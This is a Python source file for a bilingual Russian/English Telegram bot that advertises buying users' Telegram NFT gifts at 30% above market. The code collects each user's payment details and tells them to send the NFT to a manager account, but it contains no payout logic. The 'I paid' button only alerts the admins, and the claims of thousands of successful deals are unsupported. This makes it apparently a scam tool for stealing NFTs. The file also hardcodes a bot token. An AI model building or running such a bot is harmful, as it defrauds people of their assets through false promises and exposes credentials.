import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ==================== CONFIG ====================
BOT_TOKEN = "8760557568:AAFhxPzGyMbSuN7nSoYo1ZNJab0rxNwUJDk"
ADMIN_IDS = [174415647, 6765669825]
MANAGER = "@liiina_newq"

# ==================== STATES ====================
WAITING_NFT_LINK = 1
WAITING_PAYMENT_METHOD = 2
WAITING_REQUISITES = 3
WAITING_PAYMENT_CONFIRMATION = 4

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("nft_bot")

# ==================== ВАЛЮТЫ ПОД КАЖДЫЙ МЕТОД ====================
PAYMENT_CURRENCY = [
    ("USDT", "USDT"),   # 0  CryptoBot
    ("USDT", "USDT"),   # 1  TRC20
    ("TON",  "TON"),    # 2  Tonkeeper
    ("UAH",  "грн"),    # 3  Украина
    ("RUB",  "руб"),    # 4  Россия
    ("USD",  "$"),      # 5  США
    ("BYN",  "руб"),    # 6  Беларусь
    ("KZT",  "тг"),     # 7  Казахстан
    ("UZS",  "сум"),    # 8  Узбекистан
    ("TRY",  "₺"),      # 9  Турция
    ("AZN",  "₼"),      # 10 Азербайджан
]

# Курсы к USD
RATES = {
    "USDT": 1,
    "TON":  0.19,
    "UAH":  41,
    "RUB":  90,
    "USD":  1,
    "BYN":  3.2,
    "KZT":  480,
    "UZS":  12800,
    "TRY":  32,
    "AZN":  1.7,
}

# ==================== NFT ЦЕНЫ (фиксированные, без рандома) ====================
NFT_PRICES_USD = {
    # Топовые коллекции
    "plushpepe": 7500,
    "plush": 7500,
    "pepe": 7500,
    
    # Средний сегмент
    "dragon": 300,
    "crystal": 170,
    "gem": 170,
    "diamond": 250,
    "heart": 95,
    "star": 80,
    "loot": 110,
    "gold": 580,
    
    # Базовый сегмент
    "cat": 23,
    "bear": 19,
    "dog": 15,
    "duck": 12,
    "bunny": 14,
    "jelly": 14,
    "santa": 10,
    "cake": 8,
    "wine": 8,
    "hat": 9,
    "gift": 10,
}

def estimate_price_usd(nft_name):
    """Оцениваем NFT по названию. Фиксированные цены, без рандома."""
    name_lower = nft_name.lower().replace("-", "").replace("_", "")
    
    for key, price in NFT_PRICES_USD.items():
        if key in name_lower:
            our_price = round(price * 1.30, 2)
            return price, our_price
    
    # Неизвестный NFT — фиксированная цена 15 USDT
    base = 15.00
    our_price = round(base * 1.30, 2)
    return base, our_price

def convert_price(usd_amount, currency_code):
    rate = RATES.get(currency_code, 1)
    if currency_code in ("USDT", "USD"):
        return round(usd_amount, 2)
    if currency_code == "TON":
        return round(usd_amount / 0.19, 2)
    return round(usd_amount * rate, 0)

def format_price(amount, pay_idx):
    currency_code, currency_label = PAYMENT_CURRENCY[pay_idx]
    converted = convert_price(amount, currency_code)
    if currency_code in ("USDT", "USD"):
        return f"${converted} {currency_code}"
    elif currency_code == "TON":
        return f"{converted} TON"
    else:
        return f"{int(converted)} {currency_label}"

def is_nft_link(text):
    return bool(re.match(r'https?://t\.me/nft/[\w\-]+', text.strip()))

def get_lang(context):
    return context.user_data.get("lang", "ru")

# ==================== TEXTS ====================

WELCOME_RU = (
    "🎁 *Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram!*\n\n"
    "Мы — профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n"
    "Наш бот автоматически оценивает ваш NFT и предлагает цену *на 30% выше рынка* 📈\n\n"
    "Тысячи успешных сделок. Быстрые выплаты. Полная безопасность.\n\n"
    "Выберите действие ниже 👇"
)

WELCOME_EN = (
    "🎁 *Welcome to the Automatic NFT Gift Buyout service in Telegram!*\n\n"
    "We are a professional service that purchases NFT gifts above market value.\n"
    "Our bot automatically evaluates your NFT and offers a price *30% above the market* 📈\n\n"
    "Thousands of successful deals. Fast payouts. Full security.\n\n"
    "Choose an action below 👇"
)

HOW_DEAL_RU = (
    "🤝 *Как проводится сделка?*\n\n"
    "1. Вы присылаете ссылку на NFT-подарок\n"
    "2. Бот оценивает его стоимость\n"
    "3. Вы выбираете способ оплаты\n"
    "4. Бот показывает сумму в вашей валюте\n"
    "5. Вы подтверждаете сделку\n"
    "6. Отправляете NFT менеджеру\n"
    "7. Получаете оплату и нажимаете \"Я оплатил\"\n\n"
    f"Менеджер: {MANAGER}\n\n"
    "⚡ Среднее время сделки: 5–15 минут"
)

HOW_DEAL_EN = (
    "🤝 *How is the deal conducted?*\n\n"
    "1. You send the NFT gift link\n"
    "2. The bot evaluates its value\n"
    "3. You choose a payment method\n"
    "4. The bot shows the amount in your currency\n"
    "5. You confirm the deal\n"
    "6. Send the NFT to the manager\n"
    "7. Receive payment and press \"I paid\"\n\n"
    f"Manager: {MANAGER}\n\n"
    "⚡ Average deal time: 5–15 minutes"
)

SELL_ASK_LINK_RU = "🔗 *Отправьте ссылку на ваш NFT-подарок*\n\nФормат: `https://t.me/nft/Название-Номер`"
SELL_ASK_LINK_EN = "🔗 *Send the link to your NFT gift*\n\nFormat: `https://t.me/nft/Name-Number`"

PAYMENT_METHODS_RU = [
    "💎 CryptoBot (USDT)", "🔷 TRC20 (USDT)", "💎 Tonkeeper (TON)",
    "🇺🇦 Карта — Украина", "🇷🇺 Карта — Россия", "🇺🇸 Карта — США",
    "🇧🇾 Карта — Беларусь", "🇰🇿 Карта — Казахстан", "🇺🇿 Карта — Узбекистан",
    "🇹🇷 Карта — Турция", "🇦🇿 Карта — Азербайджан",
]

PAYMENT_METHODS_EN = [
    "💎 CryptoBot (USDT)", "🔷 TRC20 (USDT)", "💎 Tonkeeper (TON)",
    "🇺🇦 Card — Ukraine", "🇷🇺 Card — Russia", "🇺🇸 Card — USA",
    "🇧🇾 Card — Belarus", "🇰🇿 Card — Kazakhstan", "🇺🇿 Card — Uzbekistan",
    "🇹🇷 Card — Turkey", "🇦🇿 Card — Azerbaijan",
]

# ==================== KEYBOARDS ====================

def lang_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
    ]])

def main_menu_keyboard(lang):
    text_sell = "💰 Продать NFT" if lang == "ru" else "💰 Sell NFT"
    text_how = "⚙️ Как проводится сделка?" if lang == "ru" else "⚙️ How it works?"
    text_support = "🆘 Поддержка" if lang == "ru" else "🆘 Support"
    
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text_sell, callback_data="sell")],
        [InlineKeyboardButton(text_how, callback_data="how_deal")],
        [InlineKeyboardButton(text_support, callback_data="support")],
    ])

def payment_keyboard(lang):
    methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
    buttons = []
    for i, method in enumerate(methods):
        buttons.append([InlineKeyboardButton(method, callback_data=f"pay_{i}")])
    
    back_text = "◀️ Назад" if lang == "ru" else "◀️ Back"
    buttons.append([InlineKeyboardButton(back_text, callback_data="back_main")])
    return InlineKeyboardMarkup(buttons)

def confirm_keyboard(lang):
    yes = "✅ Да, согласен" if lang == "ru" else "✅ Yes, I agree"
    no = "❌ Нет" if lang == "ru" else "❌ No"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(yes, callback_data="confirm_yes")],
        [InlineKeyboardButton(no, callback_data="confirm_no")],
    ])

def deal_keyboard(lang):
    if lang == "ru":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💸 Я оплатил", callback_data="paid")],
            [InlineKeyboardButton("⛓️ В меню", callback_data="back_main")],
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💸 I paid", callback_data="paid")],
            [InlineKeyboardButton("⛓️ Main menu", callback_data="back_main")],
        ])

def back_keyboard(lang):
    text = "◀️ Главное меню" if lang == "ru" else "◀️ Main menu"
    return InlineKeyboardMarkup([[InlineKeyboardButton(text, callback_data="back_main")]])

def admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton("💬 Все сделки", callback_data="admin_deals")],
    ])

# ==================== HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        "🌍 Выберите язык / Choose your language:",
        reply_markup=lang_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    lang = get_lang(context)

    # Язык
    if data == "lang_ru":
        context.user_data["lang"] = "ru"
        await query.edit_message_text(WELCOME_RU, parse_mode="Markdown", reply_markup=main_menu_keyboard("ru"))
        return

    if data == "lang_en":
        context.user_data["lang"] = "en"
        await query.edit_message_text(WELCOME_EN, parse_mode="Markdown", reply_markup=main_menu_keyboard("en"))
        return

    # Главное меню
    if data == "back_main":
        text = WELCOME_RU if lang == "ru" else WELCOME_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(lang))
        context.user_data.clear()
        return

    # Как сделка
    if data == "how_deal":
        text = HOW_DEAL_RU if lang == "ru" else HOW_DEAL_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    # Поддержка
    if data == "support":
        if lang == "ru":
            text = f"🆘 *Поддержка*\n\nПо всем вопросам: {MANAGER}"
        else:
            text = f"🆘 *Support*\n\nFor all questions: {MANAGER}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    # Продажа
    if data == "sell":
        context.user_data["state"] = WAITING_NFT_LINK
        text = SELL_ASK_LINK_RU if lang == "ru" else SELL_ASK_LINK_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    # Выбор оплаты
    if data.startswith("pay_"):
        idx = int(data.split("_")[1])
        context.user_data["pay_idx"] = idx
        context.user_data["payment"] = (PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN)[idx]
        context.user_data["state"] = WAITING_REQUISITES
        
        nft_link = context.user_data.get("nft_link", "NFT")
        our_usd = context.user_data.get("our_price", 0)
        price_str = format_price(our_usd, idx)
        
        if lang == "ru":
            text = f"💳 *Способ:* {context.user_data['payment']}\n\n📎 NFT: `{nft_link}`\n💰 Сумма: {price_str}\n\n📝 Введите реквизиты:"
        else:
            text = f"💳 *Method:* {context.user_data['payment']}\n\n📎 NFT: `{nft_link}`\n💰 Amount: {price_str}\n\n📝 Enter payment details:"
        
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    # Подтверждение "Да"
    if data == "confirm_yes":
        nft_link = context.user_data.get("nft_link", "")
        our_usd = context.user_data.get("our_price", 0)
        pay_idx = context.user_data.get("pay_idx", 0)
        price_str = format_price(our_usd, pay_idx)
        payment = context.user_data.get("payment", "")
        requisites = context.user_data.get("requisites", "")

        if lang == "ru":
            text = (
                f"✅ *Сделка подтверждена!*\n\n"
                f"📎 NFT: `{nft_link}`\n"
                f"💰 Сумма: *{price_str}*\n"
                f"💳 Способ: {payment}\n"
                f"📝 Реквизиты: `{requisites}`\n\n"
                f"📤 Отправьте NFT менеджеру {MANAGER}\n\n"
                "После получения оплаты нажмите кнопку ниже:"
            )
        else:
            text = (
                f"✅ *Deal confirmed!*\n\n"
                f"📎 NFT: `{nft_link}`\n"
                f"💰 Amount: *{price_str}*\n"
                f"💳 Method: {payment}\n"
                f"📝 Details: `{requisites}`\n\n"
                f"📤 Send NFT to manager {MANAGER}\n\n"
                "After receiving payment, press the button below:"
            )
        
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=deal_keyboard(lang))
        context.user_data["state"] = WAITING_PAYMENT_CONFIRMATION

        # Уведомление админам
        user = query.from_user
        admin_text = (
            f"🔔 *Новая сделка!*\n"
            f"👤 Пользователь: @{user.username or user.id} ({user.id})\n"
            f"📎 NFT: {nft_link}\n"
            f"💰 Сумма: {price_str}\n"
            f"💳 Метод: {payment}\n"
            f"📝 Реквизиты: {requisites}"
        )
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(admin_id, admin_text, parse_mode="Markdown")
            except:
                pass
        return

    # Подтверждение "Нет"
    if data == "confirm_no":
        text = "❌ Отказ. Возврат в меню." if lang == "ru" else "❌ Declined. Back to menu."
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        context.user_data.clear()
        return

    # Кнопка "Я оплатил"
    if data == "paid":
        nft_link = context.user_data.get("nft_link", "")
        price_str = format_price(context.user_data.get("our_price", 0), context.user_data.get("pay_idx", 0))
        
        if lang == "ru":
            text = f"💸 *Спасибо!*\n\nМенеджер {MANAGER} уже уведомлен.\n\n📎 NFT: `{nft_link}`\n💰 Сумма: {price_str}"
        else:
            text = f"💸 *Thank you!*\n\nManager {MANAGER} has been notified.\n\n📎 NFT: `{nft_link}`\n💰 Amount: {price_str}"
        
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        
        # Уведомление админам
        user = query.from_user
        admin_text = f"💰 *Оплата подтверждена!*\n👤 Пользователь: @{user.username or user.id} ({user.id})\n📎 NFT: {nft_link}\n💰 Сумма: {price_str}"
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(admin_id, admin_text, parse_mode="Markdown")
            except:
                pass
        
        context.user_data.clear()
        return

    # Админ-панель
    if data == "admin_stats":
        await query.edit_message_text("📊 Статистика временно недоступна", reply_markup=admin_keyboard())
    elif data == "admin_broadcast":
        await query.edit_message_text("📢 Рассылка временно недоступна", reply_markup=admin_keyboard())
    elif data == "admin_deals":
        await query.edit_message_text("💬 Сделки временно недоступны", reply_markup=admin_keyboard())

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    lang = get_lang(context)
    text = update.message.text.strip()

    # Ожидание ссылки на NFT
    if state == WAITING_NFT_LINK:
        if not is_nft_link(text):
            err = "⚠️ *Ошибка!* Неверная ссылка." if lang == "ru" else "⚠️ *Error!* Invalid link."
            await update.message.reply_text(err, parse_mode="Markdown")
            return

        context.user_data["nft_link"] = text
        nft_name = text.split("/nft/")[-1].split("-")[0]
        base_usd, our_usd = estimate_price_usd(nft_name)
        context.user_data["base_price"] = base_usd
        context.user_data["our_price"] = our_usd
        context.user_data["state"] = WAITING_PAYMENT_METHOD

        if lang == "ru":
            msg = f"🔍 *Анализ NFT:*\n\n📎 `{text}`\n🏷 Рынок: ${base_usd}\n💰 *Наше: ${our_usd} (+30%)*"
        else:
            msg = f"🔍 *NFT Analysis:*\n\n📎 `{text}`\n🏷 Market: ${base_usd}\n💰 *Our offer: ${our_usd} (+30%)*"
        
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=payment_keyboard(lang))
        return

    # Ожидание реквизитов
    if state == WAITING_REQUISITES:
        context.user_data["requisites"] = text
        context.user_data["state"] = None
        
        nft_link = context.user_data.get("nft_link", "")
        our_usd = context.user_data.get("our_price", 0)
        base_usd = context.user_data.get("base_price", 0)
        pay_idx = context.user_data.get("pay_idx", 0)
        payment = context.user_data.get("payment", "")
        
        price_str = format_price(our_usd, pay_idx)
        market_str = format_price(base_usd, pay_idx)

        if lang == "ru":
            msg = (
                f"📋 *Итог сделки:*\n\n"
                f"📎 NFT: `{nft_link}`\n"
                f"💳 Способ: {payment}\n"
                f"🏷 Рынок: {market_str}\n"
                f"💰 Сумма: *{price_str}*\n"
                f"📝 Реквизиты: `{text}`\n\n"
                f"💬 Предложение: {price_str}\n\n"
                f"Согласны?"
            )
        else:
            msg = (
                f"📋 *Deal summary:*\n\n"
                f"📎 NFT: `{nft_link}`\n"
                f"💳 Method: {payment}\n"
                f"🏷 Market: {market_str}\n"
                f"💰 Amount: *{price_str}*\n"
                f"📝 Details: `{text}`\n\n"
                f"💬 Offer: {price_str}\n\n"
                f"Agree?"
            )
        
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=confirm_keyboard(lang))
        return

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Доступ запрещён.")
        return

    caption = "🛡 *ADMIN PANEL*\n\nВыберите действие:"
    await update.message.reply_text(caption, parse_mode="Markdown", reply_markup=admin_keyboard())

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    print("✅ Бот успешно запущен!")
    app.run_polling()

if __name__ == "__main__":
    main()
